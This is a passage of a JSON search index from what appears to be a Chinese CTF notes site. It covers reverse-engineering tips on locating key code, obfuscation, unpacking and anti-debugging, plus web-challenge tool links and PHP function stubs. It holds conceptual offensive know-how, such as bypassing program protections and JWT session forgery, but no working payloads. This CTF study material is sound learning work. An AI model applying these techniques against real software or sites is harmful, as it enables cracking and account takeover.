<li>\u7814\u7a76\u7a0b\u5e8f\u7684\u4fdd\u62a4\u65b9\u6cd5\uff0c\u5982\u4ee3\u7801\u6df7\u6dc6\uff0c\u4fdd\u62a4\u58f3\u53ca\u53cd\u8c03\u8bd5\u7b49\u6280\u672f\uff0c\u5e76\u8bbe\u6cd5\u7834\u9664\u6216\u7ed5\u8fc7\u4fdd\u62a4</li> <li>\u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u5feb\u901f\u5b9a\u4f4d\u5230\u5173\u952e\u4ee3\u7801\u8fdb\u884c\u5206\u6790</li> <li>\u7ed3\u5408\u52a8\u6001\u8c03\u8bd5\uff0c\u9a8c\u8bc1\u81ea\u5df1\u7684\u521d\u671f\u731c\u60f3\uff0c\u5728\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\u7406\u6e05\u7a0b\u5e8f\u529f\u80fd</li> <li>\u9488\u5bf9\u7a0b\u5e8f\u529f\u80fd\uff0c\u5199\u51fa\u5bf9\u5e94\u811a\u672c\uff0c\u6c42\u89e3\u51faflag</li> </ol>"},{"location":"reverse/introduction/#tips","title":"\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801tips","text":"<ol> <li> <p>\u5206\u6790\u63a7\u5236\u6d41</p> <p>\u63a7\u5236\u6d41\u53ef\u4ee5\u53c2\u89c1IDA\u751f\u6210\u7684\u63a7\u5236\u6d41\u7a0b\u56fe\uff08CFG\uff09\uff0c\u6cbf\u7740\u5206\u652f\u5faa\u73af\u548c\u51fd\u6570\u8c03\u7528\uff0c\u9010\u5757\u5730\u9605\u8bfb\u53cd\u6c47\u7f16\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u3002</p> </li> <li> <p>\u5229\u7528\u6570\u636e\u3001\u4ee3\u7801\u4ea4\u53c9\u5f15\u7528</p> <p>\u6bd4\u5982\u8f93\u51fa\u7684\u63d0\u793a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u6570\u636e\u4ea4\u53c9\u5f15\u7528\u627e\u5230\u5bf9\u5e94\u7684\u8c03\u7528\u4f4d\u7f6e\uff0c\u8fdb\u800c\u627e\u51fa\u5173\u952e\u4ee3\u7801\u3002\u4ee3\u7801\u4ea4\u53c9\u5f15\u7528\u6bd4\u5982\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\u83b7\u53d6\u7528\u6237\u8f93\u5165\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684windowsAPI\u51fd\u6570\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9bAPI\u51fd\u6570\u8c03\u7528\u4f4d\u7f6e\u627e\u5230\u5173\u952e\u4ee3\u7801\u3002</p> </li> </ol>"},{"location":"reverse/introduction/#tips_1","title":"\u9006\u5411tips","text":"<ol> <li> <p>\u7f16\u7801\u98ce\u683c</p> <p>\u6bcf\u4e2a\u7a0b\u5e8f\u5458\u7684\u7f16\u7801\u98ce\u683c\u90fd\u6709\u6240\u4e0d\u540c\uff0c\u719f\u6089\u5f00\u53d1\u8bbe\u8ba1\u6a21\u5f0f\u7684\u540c\u5b66\u80fd\u66f4\u8fc5\u901f\u5730\u5206\u6790\u51fa\u51fd\u6570\u6a21\u5757\u529f\u80fd</p> </li> <li> <p>\u96c6\u4e2d\u539f\u5219</p> <p>\u7a0b\u5e8f\u5458\u5f00\u53d1\u7a0b\u5e8f\u65f6\uff0c\u5f80\u5f80\u4e60\u60ef\u5c06\u529f\u80fd\u76f8\u5173\u7684\u4ee3\u7801\u6216\u662f\u6570\u636e\u5199\u5728\u540c\u4e00\u4e2a\u5730\u65b9\uff0c\u800c\u5728\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u4e5f\u80fd\u663e\u793a\u51fa\u8fd9\u4e00\u60c5\u51b5\uff0c\u56e0\u6b64\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u67e5\u770b\u5173\u952e\u4ee3\u7801\u9644\u8fd1\u7684\u51fd\u6570\u548c\u6570\u636e\u3002</p> </li> <li> <p>\u4ee3\u7801\u590d\u7528</p> <p>\u4ee3\u7801\u590d\u7528\u60c5\u51b5\u975e\u5e38\u666e\u904d\uff0c\u800c\u6700\u5927\u7684\u6e90\u4ee3\u7801\u4ed3\u5e93Github\u5219\u662f\u6700\u4e3b\u8981\u7684\u6765\u6e90\u3002\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u627e\u4e00\u4e9b\u7279\u5f81\uff08\u5982\u5b57\u7b26\u4e32\uff0c\u4ee3\u7801\u98ce\u683c\u7b49\uff09\u5728Github\u641c\u7d22\uff0c\u53ef\u80fd\u4f1a\u53d1\u73b0\u7c7b\u4f3c\u7684\u4ee3\u7801\uff0c\u5e76\u636e\u6b64\u6062\u590d\u51fa\u5206\u6790\u65f6\u7f3a\u5931\u7684\u7b26\u53f7\u4fe1\u606f\u7b49\u3002</p> </li> <li> <p>\u4e03\u5206\u9006\u5411\u4e09\u5206\u731c</p> <p>\u5408\u7406\u7684\u731c\u6d4b\u5f80\u5f80\u80fd\u4e8b\u534a\u529f\u500d\uff0c\u9047\u5230\u53ef\u7591\u51fd\u6570\u5374\u770b\u4e0d\u6e05\u91cc\u9762\u7684\u903b\u8f91\uff0c\u4e0d\u59a8\u6839\u636e\u5176\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9\u731c\u6d4b\u5176\u529f\u80fd\uff0c\u5e76\u4f9d\u636e\u731c\u6d4b\u7ee7\u7eed\u5411\u4e0b\u5206\u6790\uff0c\u5728\u4e0d\u65ad\u7684\u731c\u6d4b\u9a8c\u8bc1\u4e2d\uff0c\u6216\u8bb8\u80fd\u5e2e\u52a9\u4f60\u66f4\u52a0\u63a5\u8fd1\u4ee3\u7801\u7684\u771f\u76f8\u3002</p> </li> <li> <p>\u533a\u5206\u4ee3\u7801</p> <p>\u62ff\u5230\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u5fc5\u987b\u80fd\u533a\u5206\u54ea\u4e9b\u4ee3\u7801\u662f\u4eba\u4e3a\u7f16\u5199\u7684\uff0c\u800c\u54ea\u4e9b\u662f\u7f16\u8bd1\u5668\u81ea\u52a8\u9644\u52a0\u7684\u4ee3\u7801\u3002\u4eba\u4e3a\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0c\u53c8\u6709\u54ea\u4e9b\u662f\u5e93\u51fd\u6570\u4ee3\u7801\uff0c\u54ea\u4e9b\u624d\u662f\u51fa\u9898\u4eba\u81ea\u5df1\u5199\u7684\u4ee3\u7801\uff0c\u51fa\u9898\u4eba\u7684\u4ee3\u7801\u53c8\u7ecf\u8fc7\u7f16\u8bd1\u5668\u600e\u6837\u7684\u4f18\u5316\uff1f\u6211\u4eec\u65e0\u987b\u82b1\u8d39\u65f6\u95f4\u5728\u51fa\u9898\u4eba\u4ee5\u5916\u7684\u4ee3\u7801\u4e0a\uff0c\u8fd9\u5f88\u91cd\u8981\u3002\u5982\u679c\u5f53\u4f60\u5206\u6790\u534a\u5929\u8fd8\u5728\u5e93\u51fd\u6570\u91cc\u4e71\u8f6c\uff0c\u90a3\u4e0d\u4ec5\u4f53\u9a8c\u6781\u5dee\uff0c\u4e5f\u6ca1\u6709\u4e1d\u6beb\u6548\u679c\u3002</p> </li> <li> <p>\u8010\u5fc3</p> <p>\u65e0\u8bba\u5982\u4f55\uff0c\u7ed9\u4e88\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u603b\u662f\u80fd\u5c06\u4e00\u4e2a\u7a0b\u5e8f\u5206\u6790\u5730\u900f\u5f7b\u3002\u4f46\u662f\u4e5f\u4e0d\u5e94\u8be5\u8fc7\u65e9\u5730\u653e\u5f03\u5206\u6790\u3002\u76f8\u4fe1\u81ea\u5df1\u80af\u5b9a\u80fd\u5728\u62bd\u8327\u5265\u4e1d\u7684\u8fc7\u7a0b\u4e2d\u7a81\u7834\u95ee\u9898\u3002</p> </li> </ol>"},{"location":"reverse/introduction/#_5","title":"\u52a8\u6001\u5206\u6790","text":"<p>\u52a8\u6001\u5206\u6790\u7684\u76ee\u7684\u5728\u4e8e\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801\u540e\uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u501f\u7531\u8f93\u51fa\u4fe1\u606f\uff08\u5bc4\u5b58\u5668\uff0c\u5185\u5b58\u53d8\u5316\uff0c\u7a0b\u5e8f\u8f93\u51fa\uff09\u7b49\u6765\u9a8c\u8bc1\u81ea\u5df1\u7684\u63a8\u65ad\u6216\u662f\u7406\u89e3\u7a0b\u5e8f\u529f\u80fd</p> <p>\u4e3b\u8981\u65b9\u6cd5\u6709\uff1a\u8c03\u8bd5\uff0c\u7b26\u53f7\u6267\u884c\uff0c\u6c61\u70b9\u5206\u6790</p>"},{"location":"reverse/introduction/#_6","title":"\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\u8bc6\u522b","text":"<ul> <li>\u5e38\u7528\u7b97\u6cd5\u8bc6\u522b</li> </ul> <p>\u5982<code>Tea/XTea/XXTea/IDEA/RC4/RC5/RC6/AES/DES/IDEA/MD5/SHA256/SHA1</code>\u7b49\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5927\u6570\u52a0\u51cf\u4e58\u9664\u3001\u6700\u77ed\u8def\u7b49\u4f20\u7edf\u7b97\u6cd5</p> <ul> <li>\u5e38\u7528\u6570\u636e\u7ed3\u6784\u8bc6\u522b</li> </ul> <p>\u5982\u56fe\u3001\u6811\u3001\u54c8\u5e0c\u8868\u7b49\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\u7684\u8bc6\u522b\u3002</p>"},{"location":"reverse/introduction/#_7","title":"\u4ee3\u7801\u6df7\u6dc6","text":"<p>\u6bd4\u5982\u4f7f\u7528<code>OLLVM</code>\uff0c<code>movfuscator</code>\uff0c<code>\u82b1\u6307\u4ee4</code>\uff0c<code>\u865a\u62df\u5316</code>\u53ca<code>SMC</code>\u7b49\u5de5\u5177\u6280\u672f\u5bf9\u4ee3\u7801\u8fdb\u884c\u6df7\u6dc6\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5206\u6790\u5341\u5206\u56f0\u96be\u3002</p> <p>\u90a3\u4e48\u5bf9\u5e94\u7684\u4e5f\u6709\u53cd\u6df7\u6dc6\u6280\u672f\uff0c\u6700\u4e3b\u8981\u7684\u76ee\u7684\u5c31\u662f\u590d\u539f\u63a7\u5236\u6d41\u3002\u6bd4\u5982<code>\u6a21\u62df\u6267\u884c</code>\u548c<code>\u7b26\u53f7\u6267\u884c</code></p>"},{"location":"reverse/introduction/#_8","title":"\u4fdd\u62a4\u58f3","text":"<p>\u4fdd\u62a4\u58f3\u7c7b\u578b\u6709\u8bb8\u591a\uff0c\u7b80\u5355\u7684\u538b\u7f29\u58f3\u53ef\u4ee5\u5f52\u7c7b\u4e3a\u5982\u4e0b\u51e0\u79cd</p> <ul> <li> <p>unpack -&gt; execute</p> <p>\u76f4\u63a5\u5c06\u7a0b\u5e8f\u4ee3\u7801\u5168\u90e8\u89e3\u538b\u5230\u5185\u5b58\u4e2d\u518d\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\u4ee3\u7801</p> </li> <li> <p>unpack -&gt; execute -&gt; unpack -&gt; execute ...</p> <p>\u89e3\u538b\u90e8\u5206\u4ee3\u7801\uff0c\u518d\u8fb9\u89e3\u538b\u8fb9\u6267\u884c</p> </li> <li> <p>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</p> <p>\u7a0b\u5e8f\u4ee3\u7801\u6709\u8fc7\u7f16\u7801\uff0c\u5728\u89e3\u538b\u540e\u518d\u8fd0\u884c\u51fd\u6570\u5c06\u771f\u6b63\u7684\u7a0b\u5e8f\u4ee3\u7801\u89e3\u7801\u6267\u884c</p> </li> </ul> <p>\u5bf9\u4e8e\u8131\u58f3\u4e5f\u6709\u76f8\u5173\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982<code>\u5355\u6b65\u8c03\u8bd5\u6cd5</code>\uff0c<code>ESP\u5b9a\u5f8b</code>\u7b49\u7b49</p>"},{"location":"reverse/introduction/#_9","title":"\u53cd\u8c03\u8bd5","text":"<p>\u53cd\u8c03\u8bd5\u610f\u5728\u901a\u8fc7\u68c0\u6d4b\u8c03\u8bd5\u5668\u7b49\u65b9\u6cd5\u907f\u514d\u7a0b\u5e8f\u88ab\u8c03\u8bd5\u5206\u6790\u3002\u6bd4\u5982\u4f7f\u7528\u4e00\u4e9bAPI\u51fd\u6570\u5982<code>IsDebuggerPresent</code>\u68c0\u6d4b\u8c03\u8bd5\u5668\uff0c\u4f7f\u7528<code>SEH\u5f02\u5e38\u5904\u7406</code>\uff0c\u65f6\u95f4\u5dee\u68c0\u6d4b\u7b49\u65b9\u6cd5\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8986\u5199\u8c03\u8bd5\u7aef\u53e3\u3001\u81ea\u8c03\u8bd5\u7b49\u65b9\u6cd5\u8fdb\u884c\u4fdd\u62a4\u3002</p>"},{"location":"reverse/introduction/#_10","title":"\u975e\u5e38\u89c4\u9006\u5411\u601d\u8def","text":"<p>\u975e\u5e38\u89c4\u9006\u5411\u9898\u8bbe\u8ba1\u7684\u9898\u76ee\u8303\u56f4\u975e\u5e38\u4e4b\u5e7f\uff0c\u53ef\u4ee5\u662f\u4efb\u610f\u67b6\u6784\u7684\u4efb\u610f\u683c\u5f0f\u6587\u4ef6\u3002</p> <ul> <li>lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc..</li> <li>firmware/raw bin/etc..</li> <li>chip8/avr/clemency/risc-v/etc.</li> </ul> <p>\u4f46\u662f\u9006\u5411\u5de5\u7a0b\u7684\u65b9\u6cd5\u5b66\u91cc\u4e0d\u60e7\u6015\u8fd9\u4e9b\u672a\u77e5\u7684\u5e73\u53f0\u683c\u5f0f\uff0c\u9047\u5230\u8fd9\u6837\u7684\u975e\u5e38\u89c4\u9898\uff0c\u6211\u4eec\u4e5f\u6709\u4e00\u4e9b\u57fa\u672c\u7684\u6d41\u7a0b\u53ef\u4ee5\u901a\u7528</p>"},{"location":"reverse/introduction/#_11","title":"\u524d\u671f\u51c6\u5907","text":"<ul> <li>\u9605\u8bfb\u6587\u6863\u3002\u5feb\u901f\u5b66\u4e60\u5e73\u53f0\u8bed\u8a00\u7684\u65b9\u6cd5\u5c31\u662f\u53bb\u9605\u8bfb\u5b98\u65b9\u6587\u6863\u3002</li> <li>\u5b98\u65b9\u5de5\u5177\u3002\u5b98\u65b9\u63d0\u4f9b\u6216\u5efa\u8bae\u7684\u5de5\u5177\u5fc5\u7136\u662f\u6700\u5408\u9002\u7684\u5de5\u5177</li> <li>\u6559\u7a0b\u3002\u5728\u9006\u5411\u65b9\u9762\uff0c\u4e5f\u8bb8\u6709\u8bb8\u591a\u524d\u8f88\u5199\u51fa\u4e86\u4e13\u95e8\u9488\u5bf9\u8be5\u5e73\u53f0\u8bed\u8a00\u7684\u9006\u5411\u6559\u7a0b\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5feb\u901f\u5438\u6536\u8fd9\u5176\u4e2d\u7684\u77e5\u8bc6\u3002</li> </ul>"},{"location":"reverse/introduction/#_12","title":"\u627e\u5de5\u5177","text":"<p>\u4e3b\u8981\u627e<code>\u6587\u4ef6\u89e3\u6790\u5de5\u5177</code>\u3001<code>\u53cd\u6c47\u7f16\u5668</code>\u3001<code>\u8c03\u8bd5\u5668</code>\u548c<code>\u53cd\u7f16\u8bd1\u5668</code>\u3002\u5176\u4e2d<code>\u53cd\u6c47\u7f16\u5668</code>\u662f\u5fc5\u9700\u7684\uff0c<code>\u8c03\u8bd5\u5668</code>\u4e5f\u5305\u542b\u6709\u76f8\u5e94\u7684\u53cd\u6c47\u7f16\u529f\u80fd\uff0c\u800c\u5bf9\u4e8e<code>\u53cd\u7f16\u8bd1\u5668</code>\u5219\u8981\u81ea\u6c42\u591a\u798f\u4e86\uff0c\u5f97\u4e4b\u6211\u5e78\u5931\u4e4b\u6211\u547d\u3002</p> <p>\u627e\u5de5\u5177\u603b\u7ed3\u8d77\u6765\u5c31\u662f\uff1aGoogle\u5927\u6cd5\u597d\u3002\u5408\u7406\u5229\u7528Google\u641c\u7d22\u8bed\u6cd5\uff0c\u8fdb\u884c\u5173\u952e\u5b57\u641c\u7d22\u53ef\u4ee5\u5e2e\u52a9\u4f60\u66f4\u5feb\u66f4\u597d\u5730\u627e\u5230\u5408\u9002\u5de5\u5177\u3002</p>"},{"location":"web/changelog/","title":"Changelog","text":"<p>~\u8fd9\u91cc~\u7528\u4e8e\u8bb0\u5f55\u6587\u6863\u6240\u4f5c\u51fa\u7684\u6dfb\u52a0\u4e0e\u4fee\u6539\uff0c\u65b9\u4fbf\u5927\u5bb6\u77e5\u9053\u5728\u54ea\u6dfb\u52a0\u4e86\u4ec0\u4e48</p> <p>2021.7.11\uff1a</p> <p>\u65b0\u589eJBOSS\u6f0f\u6d1e\u7684\u6574\u7406\uff0c\u653e\u5728\u6846\u67b6\u6f0f\u6d1e\u7684java\u4e0b</p> <p>\u65b0\u589enodejs\u4e2dunicode\u635f\u574f\u5bfc\u81f4crlf</p>"},{"location":"web/introduction/","title":"Web\u7b80\u4ecb","text":"<p>web\u76f8\u5173\u7684\u6280\u672f\u8d44\u6599\u6709\u5f88\u591a\uff0c\u800c\u4e14\u6211\u4eec\u80fd\u591fgoogle\u5230\u975e\u5e38\u591a\u7684\u59ff\u52bf\u3002\u5982\u4f55\u5c06\u73b0\u6709\u7684\u77e5\u8bc6\u4ee5\u4e00\u6761\u5b8c\u6574\u7684\u94fe\u7ec4\u5408\u8d77\u6765\uff0c\u662f\u6211\u8ba4\u4e3a\u7684web\u7684\u6838\u5fc3\uff0c\u9700\u8981\u575a\u6301\u4e0d\u61c8\u7684\u52aa\u529b\u5f62\u6210\u6bd4\u8f83\u5b8c\u6574\u7684\u6e17\u900f\u4f53\u7cfb\u3002\u540c\u65f6\uff0cweb\u5b83\u53c8\u5f88\u591a\u5f88\u6742\uff0c\u4e0a\u624b\u5e94\u8be5\u662f\u6700\u7b80\u5355\u7684\uff0c\u7ee7\u7eed\u5b66\u4e0b\u53bb\u5982\u679c\u4e0d\u505a\u603b\u7ed3\u7684\u8bdd\u80af\u5b9a\u4f1a\u88ab\u6df9\u6ca1\u3002\u4ee5\u4e0b\u662f\u672c\u4eba\u534a\u5e74\u4ee5\u6765\u7684\u77e5\u8bc6\u70b9\u603b\u7ed3\uff0c\u5e0c\u671b\u80fd\u591f\u5e2e\u52a9\u5927\u5bb6\u7684\u5b66\u4e60\uff0c\u6b22\u8fce\u5404\u4f4dweb\u9009\u624b\u7684\u8865\u5145\u3002\u9274\u4e8e\u672c\u4eba\u80fd\u529b\u6c34\u5e73\u6709\u9650\uff0c\u5982\u53d1\u73b0\u9519\u8bef\u8bf7\u5148\u544a\u77e5\uff0c\u7136\u540e\u4fee\u6539\u3002\u6700\u540e\uff0c\u603b\u7ed3\u53ef\u80fd\u4f1a\u6709\u90e8\u5206\u91cd\u590d\u5185\u5bb9\u653e\u5728\u4e0d\u540c\u7684\u6a21\u5757\u91cc\u9762\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4e2a\u4eba\u5e0c\u671b\u5c3d\u53ef\u80fd\u7684\u5c06\u89e3\u9898\u91cd\u5fc3\u653e\u5728\u601d\u8def\u65b9\u9762\u3002</p> <p>\u7136\u540e\u662f\u672c\u603b\u7ed3\u662f\u4e00\u4e2a\u6846\u67b6\u6027\u8d28\u7684\u4e1c\u897f\uff0c\u4e0d\u53ef\u80fd\u4f5c\u4e3a\u767e\u79d1\u4e00\u6837\u9762\u9762\u4ff1\u5230\uff0c\u4f46\u80fd\u591f\u65b9\u4fbf\u5927\u5bb6\u5bf9\u77e5\u8bc6\u505a\u597d\u7ba1\u7406\u3002\uff08\u5982\u679c\u6709\u65f6\u95f4\u7684\u8bdd\uff0c\u6211\u4e5f\u4f1a\u5199\u4e00\u70b9\u597d\u73a9\u7684\u4e1c\u897f\uff09</p> <p>\u518d\u6709\u5c31\u662f\u4e00\u4e9b\u5de5\u5177\u6027\u7684\u4e1c\u897f\u6211\u4f1a\u9009\u62e9\u6027\u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u6700\u57fa\u7840\u7684burpsuite\uff0cSwitchyOmega\u7b49\u8fd9\u4e9b\u4e1c\u897f\u8fd8\u662f\u9ed8\u8ba4\u8981\u4f1a\u7684\u3002\uff08\u4e0d\u4f1a\u7684\u81ea\u5df1\u5199\u70b9\u603b\u7ed3\u653e\u4e0a\u6765\uff09</p> <p>\u6700\u540e\u66f4\u4e3a\u8d34\u5fc3\u7684\u662f\uff0c\u5927\u90e8\u5206\u90fd\u9644\u8d60\u4f8b\u9898</p> <p></p> <p>\uff08\u4ee5\u4e0b\u6765\u81ea\u7f51\u56fe</p> <p>\u53e6\u5916\u4e00\u5f20\u592a\u5927\u4e86\uff0c\u4e0a\u4f20\u4e0d\u4e0a\u6765</p> <p></p>"},{"location":"web/website/","title":"\u5de5\u5177\u7f51\u7ad9","text":"<p>\u5982\u679c\u6709\u77e5\u9053\u7684\u66f4\u591a\u7684\u8bdd\uff0c\u76f4\u63a5\u5f80\u4e0a\u642c\u8fd0\u5c31OK\u4e86\uff0c\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\u3002</p> <p>http://ctf.ssleye.com/\u91cc\u9762\u7528\u7684\u591a\u4e00\u70b9\u7684\u662f\u4e0e\u7f16\u7801\u76f8\u5173\uff0c\u5176\u4ed6\u5bc6\u7801\u5b66\uff0cmisc\u7b80\u5355\u4e00\u70b9\u7684\u4e5f\u4f1a\u7528\u5230\u3002</p> <ul> <li> <p>https://tool.bugku.com/\u57fa\u672c\u540c\u4e0a</p> </li> <li> <p>https://www.bejson.com/json\u683c\u5f0f\u5316\u6821\u9a8c</p> </li> <li> <p>https://tool.lu/coderunner/\u4ee3\u7801\u5728\u7ebf\u8fd0\u884c\uff08php\u7531\u4e8e\u7248\u672c\u592a\u591a\u7684\u95ee\u9898\u5efa\u8bae\u81ea\u5df1\u642d\uff09</p> </li> <li> <p>https://www.compart.com/en/unicode/search?q=thousand#characters\u5b57\u7b26\u8f6c\u7801\u7684\u7f51\u7ad9\uff0c\u7ecf\u5e38\u4f1a\u7528\u6765\u505a\u5b57\u7b26\u7ed5\u8fc7\uff0c\u6bd4\u5982\u8bf4\u1d00\u7b49\u7b49</p> </li> <li> <p>https://jwt.io/JWT\u52a0\u89e3\u5bc6\u7684\u7f51\u7ad9\uff0c\u5982\u679c\u770b\u5230session\u4e3a\u4e09\u6bb5\u5f0f\uff0c\u4e0d\u59a8\u653e\u8fdb\u53bb\u770b\u770b\u3002\u4f1a\u7528\u5728session\u4f2a\u9020\u4e2d\u3002\uff08Json web token\uff09</p> </li> <li> <p>https://github.com/bowu678/php_bugs\u4e00\u4e2a\u9879\u76ee\uff0c\u5173\u4e8ephp\u7684\u4ee3\u7801\u5ba1\u8ba1\u7684\u9879\u76ee\uff0c\u521d\u5b66\u7684\u8bdd\u53ef\u4ee5\u5b66\u5230\u86ee\u591a\u3002</p> </li> <li> <p>https://www.yuque.com/jxswcy/ctfnotebook\u535a\u5ba2\uff0c\u5efa\u8bae\u4e0d\u60f3\u505a\u9898\u7684\u65f6\u5019\u98df\u7528\u3002</p> </li> <li> <p>https://docs.python-requests.org/zh_CN/latest/user/quickstart.html#post-multipart-encoded\u8fd9\u4e2a\u662frequests\u5e93\u7684\u5b98\u65b9\u4e2d\u6587\u6587\u6863\uff0c\u7531\u4e8e\u5199\u811a\u672c\u80af\u5b9a\u662f\u4f1a\u7528\u5230\u7684\uff0c\u5efa\u8bae\u770b\u770b</p> </li> <li></li> </ul>"},{"location":"web/Function_library/PHP/","title":"abcd","text":""},{"location":"web/Function_library/PHP/#efgh","title":"efgh","text":""},{"location":"web/Function_library/PHP/#f","title":"F","text":"<pre><code>file_put_contents\nfile_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\n file_put_contents ( string $filename , mixed $data , int $flags = 0 , resource $context = ? ) : int\n data :\n\n\u8981\u5199\u5165\u7684\u6570\u636e\u3002\u7c7b\u578b\u53ef\u4ee5\u662f string\uff0carray \u6216\u8005\u662f stream \u8d44\u6e90\uff08\u5982\u4e0a\u9762\u6240\u8bf4\u7684\u90a3\u6837\uff09\u3002 \n\n flags: \n\nflags \u7684\u503c\u53ef\u4ee5\u662f \u4ee5\u4e0b flag \u4f7f\u7528 OR (|) \u8fd0\u7b97\u7b26\u8fdb\u884c\u7684\u7ec4\u5408\u3002 \n\n context\n\n\u4e00\u4e2a context \u8d44\u6e90\u3002\u00a0\n</code></pre>"},{"location":"web/Function_library/PHP/#_1","title":"abcd","text":""},{"location":"web/Function_library/PHP/#ijkl","title":"ijkl","text":""},{"location":"web/Function_library/PHP/#mnop","title":"mnop","text":""},{"location":"web/Function_library/PHP/#m","title":"m","text":"<p>'</p>"},{"location":"web/Function_library/PHP/#n","title":"n","text":""},{"location":"web/Function_library/PHP/#o","title":"o","text":""},{"location":"web/Function_library/PHP/#p","title":"p","text":""},{"location":"web/Function_library/PHP/#qrst","title":"qrst","text":""},{"location":"web/Function_library/PHP/#q","title":"Q","text":""},{"location":"web/Function_library/PHP/#r","title":"R","text":""},{"location":"web/Function_library/PHP/#s","title":"S","text":""},{"location":"web/Function_library/PHP/#scandir","title":"scandir","text":"<p>scandir() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4\u3002</p>"},{"location":"web/Function_library/PHP/#stristr","title":"stristr()","text":"<p>\u51fd\u6570\u641c\u7d22\u5b57\u7b26\u4e32\u5728\u53e6\u4e00\u5b57\u7b26\u4e32\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e8c\u8fdb\u5236\u5b89\u5168\u7684\u3002</p> <p>\u6ce8\u91ca\uff1a\u8be5\u51fd\u6570\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u3002\u5982\u9700\u8fdb\u884c\u533a\u5206\u5927\u5c0f\u5199\u7684\u641c\u7d22\uff0c\u8bf7\u4f7f\u7528 strstr() \u51fd\u6570\u3002</p>"},{"location":"web/Function_library/PHP/#t","title":"T","text":""},{"location":"web/Function_library/PHP/#uvwxyz","title":"uvwxyz","text":""},{"location":"web/Function_library/PHP/#u","title":"U","text":""},{"location":"web/Function_library/PHP/#unlink","title":"unlink","text":"<p>unlink() \u51fd\u6570\u5220\u9664\u6587\u4ef6\u3002</p> <p>\u82e5\u6210\u529f\uff0c\u5219\u8fd4\u56de true\uff0c\u5931\u8d25\u5219\u8fd4\u56de false\u3002</p> <p>unlink(filename,context)</p>"},{"location":"web/Function_library/python/","title":"abcd","text":""},{"location":"web/Function_library/python/#efgh","title":"efgh","text":""},{"location":"web/Function_library/python/#ijkl","title":"ijkl","text":""},{"location":"web/Function_library/python/#mnop","title":"mnop","text":""},{"location":"web/Function_library/python/#qrst","title":"qrst","text":""},{"location":"web/Function_library/python/#uvwxyz","title":"uvwxyz","text":""},{"location":"web/XML/xxe/","title":"XXE","text":""},{"location":"web/XML/xxe/#xml","title":"XML\u5b9a\u4e49","text":"<p>XML:\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00\uff0c\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u5b50\u96c6\uff0c\u662f\u4e00\u79cd\u7528\u4e8e\u6807\u8bb0\u7535\u5b50\u6587\u4ef6\u4f7f\u5176\u5177\u6709\u7ed3\u6784\u6027\u7684\u6807\u8bb0\u8bed\u8a00\u3002\u5b83\u88ab\u8bbe\u8ba1\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e(\u800c\u4e0d\u662f\u50a8\u5b58\u6570\u636e),\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00\u662f\u4e00\u79cd\u5f88\u50cf\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u7684\u6807\u8bb0\u8bed\u8a00\u3002\u5b83\u7684\u8bbe\u8ba1\u5b97\u65e8\u662f\u4f20\u8f93\u6570\u636e\uff0c\u800c\u4e0d\u662f\u663e\u793a\u6570\u636e\u3002\u5b83\u7684\u6807\u7b7e\u6ca1\u6709\u88ab\u9884\u5b9a\u4e49\u3002\u60a8\u9700\u8981\u81ea\u884c\u5b9a\u4e49\u6807\u7b7e\u3002\u5b83\u88ab\u8bbe\u8ba1\u4e3a\u5177\u6709\u81ea\u6211\u63cf\u8ff0\u6027\u3002\u5b83\u662fW3C\u7684\u63a8\u8350\u6807\u51c6\u3002</p> <p>\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00(XML)\u548c\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00(HTML)\u4e3a\u4e0d\u540c\u7684\u76ee\u7684\u800c\u8bbe\u8ba1</p> <p>\u5b83\u88ab\u8bbe\u8ba1\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e\uff0c\u5176\u7126\u70b9\u662f\u6570\u636e\u7684\u5185\u5bb9\u3002</p> 